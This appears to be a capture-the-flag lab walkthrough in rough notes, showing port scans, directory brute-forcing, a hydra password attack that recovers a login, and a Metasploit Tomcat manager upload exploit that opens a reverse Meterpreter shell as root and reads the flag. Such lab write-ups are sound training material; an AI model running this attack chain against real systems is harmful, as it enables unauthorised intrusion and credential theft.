```bash
─(kali㉿kali)-[~]
└─$ nmap 10.10.91.140
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 16:48 EDT
Nmap scan report for 10.10.91.140
Host is up (0.11s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13

Nmap done: 1 IP address (1 host up) scanned in 29.10 seconds


──(kali㉿kali)-[~]
└─$ nmap -sC -A -sV 10.10.91.140    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 16:48 EDT
Nmap scan report for 10.10.91.140
Host is up (0.100s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 da:73:b7:bf:5a:34:d1:6e:88:c0:fd:0f:60:f6:00:3e (RSA)
|   256 50:df:99:14:c8:0c:5e:12:5c:9d:ee:97:ae:35:d9:a7 (ECDSA)
|_  256 d5:d4:85:33:62:b1:67:77:8d:39:29:51:d9:03:fa:11 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.07 seconds
```

ajp13  ??? msfconsole



dirsearch showed not much , used bigger list ,, 

```bash 
┌──(kali㉿kali)-[~/dirsearch]
└─$ python3 dirsearch.py -u http://10.10.91.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Error Log: /home/kali/dirsearch/logs/errors-21-05-11_16-53-58.log

Target: http://10.10.91.140/

Output File: /home/kali/dirsearch/reports/10.10.91.140/_21-05-11_16-53-58.txt

[16:53:59] Starting: 
[16:54:09] 301 -  317B  - /guidelines  ->  http://10.10.91.140/guidelines/
[16:54:36] 401 -  459B  - /protected
[17:03:23] 403 -  300B  - /server-status

Task Completed
```

/guidelines

hey bob,,,,, we get user bob


nothing on msf  ,,, 


went to write up
https://github.com/DarkStar7471/CTF-ToolsRus


```bash                                                                             
┌──(kali㉿kali)-[~]
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.91.140 http-get /protected/
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-11 17:59:33
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344398 login tries (l:1/p:14344398), ~14344398 tries per task
[DATA] attacking http-get://10.10.91.140:80/protected/
[80][http-get] host: 10.10.91.140   login: bob   password: bubbles
[STATUS] attack finished for 10.10.91.140 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-11 18:00:45
```


### msf
```bash
msf6 > search tomcat_mgr_upload

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/tomcat_mgr_upload

msf6 > use 0
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified userna
                                            me
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:por
                                            t[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identi
                                            fier, or hosts file with syntax 'file
                                            :<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connec
                                            tions
   TARGETURI     /manager         yes       The URI path of the manager app (/htm
                                            l/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be spec
                                     ified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.91.140
RHOSTS => 10.10.91.140
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.6.65.43:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying nE1MJRZV...
[*] Executing nE1MJRZV...
[*] Sending stage (58033 bytes) to 10.10.91.140
[*] Undeploying nE1MJRZV ...
[*] Meterpreter session 1 opened (10.6.65.43:4444 -> 10.10.91.140:47356) at 2021-05-11 18:18:23 -0400

meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
40776/rwxrwxrw-   4096      dir   2019-03-11 02:13:25 -0400  bin
40776/rwxrwxrw-   4096      dir   2019-03-11 02:13:35 -0400  boot
40776/rwxrwxrw-   3260      dir   2021-05-11 16:47:27 -0400  dev
40776/rwxrwxrw-   4096      dir   2021-05-11 16:47:32 -0400  etc
40776/rwxrwxrw-   4096      dir   2019-03-10 17:52:32 -0400  home
100666/rw-rw-rw-  12713476  fil   2019-03-11 02:13:35 -0400  initrd.img
40776/rwxrwxrw-   4096      dir   2019-02-12 12:47:22 -0500  lib
40776/rwxrwxrw-   4096      dir   2019-02-12 12:28:02 -0500  lib64
40776/rwxrwxrw-   16384     dir   2019-02-12 12:37:53 -0500  lost+found
40776/rwxrwxrw-   4096      dir   2019-02-12 12:27:12 -0500  media
40776/rwxrwxrw-   4096      dir   2019-02-12 12:27:12 -0500  mnt
40776/rwxrwxrw-   4096      dir   2019-02-12 12:27:12 -0500  opt
40776/rwxrwxrw-   0         dir   2021-05-11 16:47:21 -0400  proc
40776/rwxrwxrw-   4096      dir   2019-03-11 12:06:14 -0400  root
40776/rwxrwxrw-   860       dir   2021-05-11 16:47:40 -0400  run
40776/rwxrwxrw-   12288     dir   2019-03-11 02:13:26 -0400  sbin
40776/rwxrwxrw-   4096      dir   2019-03-10 17:52:41 -0400  snap
40776/rwxrwxrw-   4096      dir   2019-02-12 12:27:12 -0500  srv
40776/rwxrwxrw-   0         dir   2021-05-11 16:47:23 -0400  sys
40776/rwxrwxrw-   4096      dir   2021-05-11 18:18:20 -0400  tmp
40776/rwxrwxrw-   4096      dir   2019-02-12 12:27:12 -0500  usr
40776/rwxrwxrw-   4096      dir   2019-03-10 18:19:00 -0400  var
100666/rw-rw-rw-  7030080   fil   2019-01-17 12:53:59 -0500  vmlinuz

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > id
[-] Unknown command: id.
meterpreter > getuid
Server username: root
meterpreter > cd root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-11 12:06:14 -0400  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-22 13:15:21 -0400  .bashrc
40777/rwxrwxrwx   4096  dir   2019-03-11 11:30:33 -0400  .nano
100667/rw-rw-rwx  148   fil   2015-08-17 11:30:33 -0400  .profile
40777/rwxrwxrwx   4096  dir   2019-03-10 17:52:32 -0400  .ssh
100667/rw-rw-rwx  658   fil   2019-03-11 12:05:22 -0400  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-11 12:05:22 -0400  flag.txt
40776/rwxrwxrw-   4096  dir   2019-03-10 17:52:43 -0400  snap

meterpreter > cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
meterpreter > 
```
